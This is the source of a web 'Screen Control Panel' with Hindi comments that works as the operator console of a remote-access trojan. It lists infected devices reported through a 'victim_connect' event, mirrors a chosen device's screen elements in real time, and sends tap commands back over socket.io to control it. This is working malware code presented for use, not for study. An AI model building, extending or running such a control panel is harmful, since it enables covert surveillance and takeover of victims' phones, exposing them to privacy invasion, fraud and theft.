<!DOCTYPE html>
<html>
<head>
    <title>Screen Control Panel</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f0f0; margin: 0; padding: 20px; }
        #devices, #screen-container { background-color: white; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1, h2 { color: #333; }
        ul { list-style-type: none; padding: 0; }
        li { padding: 10px; border-bottom: 1px solid #eee; cursor: pointer; }
        li:hover { background-color: #f9f9f9; }
        li.active { background-color: #e0f7fa; font-weight: bold; }
        #screen {
            position: relative;
            border: 2px solid #333;
            background-color: #000;
            overflow: hidden;
            transform-origin: top left; /* स्केलिंग के लिए मूल बिंदु सेट करें */
        }
        .element {
            position: absolute;
            border: 1px solid rgba(255, 255, 255, 0.5);
            box-sizing: border-box;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 10px;
            text-align: center;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
            cursor: pointer;
        }
        .element:hover { background-color: rgba(0, 150, 255, 0.3); }
    </style>
</head>
<body>
    <h1>Screen Control Panel</h1>
    <div id="devices">
        <h2>Connected Devices</h2>
        <ul id="device-list"></ul>
    </div>
    <div id="screen-container" style="display: none;">
        <h2 id="current-device-name"></h2>
        <div id="screen"></div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const deviceList = document.getElementById('device-list');
        const screenContainer = document.getElementById('screen-container');
        const screenDiv = document.getElementById('screen');
        const currentDeviceName = document.getElementById('current-device-name');
        let activeDeviceId = null;

        socket.on('connect', () => {
            console.log('Connected to server');
            socket.emit('admin_join');
        });

        socket.on('victim_connect', (device) => {
            addDeviceToList(device);
        });

        function addDeviceToList(device) {
            if (document.getElementById(device.deviceId)) return;
            const li = document.createElement('li');
            li.id = device.deviceId;
            li.textContent = `${device.deviceName} (ID: ${device.deviceId}) - Battery: ${device.battery}%`;
            li.onclick = () => {
                activeDeviceId = device.deviceId;
                document.querySelectorAll('#device-list li').forEach(item => item.classList.remove('active'));
                li.classList.add('active');
                screenContainer.style.display = 'block';
                currentDeviceName.textContent = `Screen of ${device.deviceName}`;
                screenDiv.innerHTML = '<p style="color: #fff; text-align: center;">Waiting for screen data...</p>';
            };
            deviceList.appendChild(li);
        }

        // =====================================================================
        // मुख्य बदलाव यहाँ है: renderScreen मेथड को अपडेट किया गया है
        // =====================================================================
        socket.on('screen_data', (data) => {
            if (data.deviceId !== activeDeviceId) return;

            screenDiv.innerHTML = ''; // पुरानी स्क्रीन को साफ करें

            const remoteWidth = data.screenWidth;
            const remoteHeight = data.screenHeight;
            
            // पैनल में स्क्रीन के लिए एक निश्चित चौड़ाई सेट करें
            const panelWidth = 400; 
            // स्केलिंग फैक्टर की गणना करें
            const scale = panelWidth / remoteWidth;

            // स्क्रीन div का आकार सेट करें
            screenDiv.style.width = remoteWidth + 'px';
            screenDiv.style.height = remoteHeight + 'px';
            // CSS ट्रांसफॉर्म का उपयोग करके पूरे स्क्रीन div को स्केल करें
            screenDiv.style.transform = `scale(${scale})`;
            
            // कंटेनर का आकार समायोजित करें ताकि स्केल्ड स्क्रीन फिट हो सके
            screenContainer.style.height = (remoteHeight * scale) + 100 + 'px';


            data.elements.forEach(elem => {
                const div = document.createElement('div');
                div.className = 'element';
                div.style.left = elem.x + 'px';
                div.style.top = elem.y + 'px';
                div.style.width = elem.width + 'px';
                div.style.height = elem.height + 'px';
                
                // फ़ॉन्ट आकार को भी थोड़ा समायोजित करें
                const fontSize = Math.min(10, elem.height * 0.3);
                div.style.fontSize = fontSize + 'px';
                
                div.textContent = elem.text || '';

                if (elem.clickable) {
                    div.style.borderColor = 'cyan'; // क्लिक करने योग्य तत्वों को हाइलाइट करें
                    div.onclick = (event) => {
                        event.stopPropagation();
                        // क्लिक निर्देशांक को वापस मूल आकार में स्केल करें
                        const clickX = elem.x + (elem.width / 2);
                        const clickY = elem.y + (elem.height / 2);
                        
                        socket.emit('touch_command', {
                            deviceId: activeDeviceId,
                            x: Math.round(clickX),
                            y: Math.round(clickY)
                        });
                    };
                }
            });
        });
        // =====================================================================

    </script>
</body>
</html>
